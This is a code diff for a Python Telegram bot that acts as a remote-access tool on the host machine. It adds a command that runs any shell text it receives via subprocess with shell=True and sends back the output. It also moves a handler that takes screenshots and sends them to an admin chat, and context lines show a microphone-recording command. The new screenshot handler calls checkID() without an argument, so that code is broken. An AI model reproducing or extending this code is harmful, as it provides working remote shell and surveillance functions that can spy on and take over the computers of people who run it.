@@ -25,7 +25,37 @@ def checkID(ms):
 def send_welcome(ms):
     if checkID(ms):
         bot.send_message(ADMIN, cmd)
+
+@bot.message_handler(commands=["screenshot"])
+def screenshot(ms):
+    if checkID():
+        myScreenshot = pyautogui.screenshot()
+        myScreenshot.save("screenshot.jpg")
         
+        with open("screenshot.jpg", "rb") as photo:
+            bot.send_photo(ADMIN, photo)
+
+
+@bot.message_handler(commands=["execute_command"])
+def execute_command_first(ms):
+    if checkID(ms):
+        bot.send_message(ADMIN, "Enter command...")
+        
+        @bot.message_handler(content_types=["text"])
+        def execute_command_last(ms):
+            try:
+                cmd = ms.text
+                output = subprocess.check_output(cmd, shell=True).decode("utf-8")
+                print(output)
+                bot.send_message(ADMIN, f"Output:\n{output}")
+            except Exception as e:
+                bot.send_message(ADMIN, f"Error:\n{e}")
+        
+        bot.register_next_step_handler(ms, execute_command_last)
+
+
+
+
 @bot.message_handler(commands=["micro_recording"])
 def micro_recording_first(ms):
     if checkID(ms):
@@ -50,13 +80,7 @@ def micro_recording_first(ms):
 
         bot.register_next_step_handler(ms, micro_recording_last)
 
-@bot.message_handler(commands=["screenshot"])
-def screenshot(ms):
-    myScreenshot = pyautogui.screenshot()
-    myScreenshot.save("screenshot.jpg")
-    
-    with open("screenshot.jpg", "rb") as photo:
-        bot.send_photo(ADMIN, photo)
+
 
 
 bot.infinity_polling()
